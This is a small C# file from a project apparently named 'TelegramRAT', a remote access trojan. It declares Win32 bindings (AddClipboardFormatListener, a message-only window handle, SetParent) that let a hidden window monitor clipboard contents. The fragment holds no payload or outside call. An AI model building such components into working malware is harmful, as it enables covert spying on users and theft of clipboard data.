using System;
using System.Runtime.InteropServices;

namespace TelegramRAT;

internal static class NativeMethods
{
	public const int WM_CLIPBOARDUPDATE = 797;

	public static IntPtr HWND_MESSAGE = new IntPtr(-3);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool AddClipboardFormatListener(IntPtr hwnd);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
}
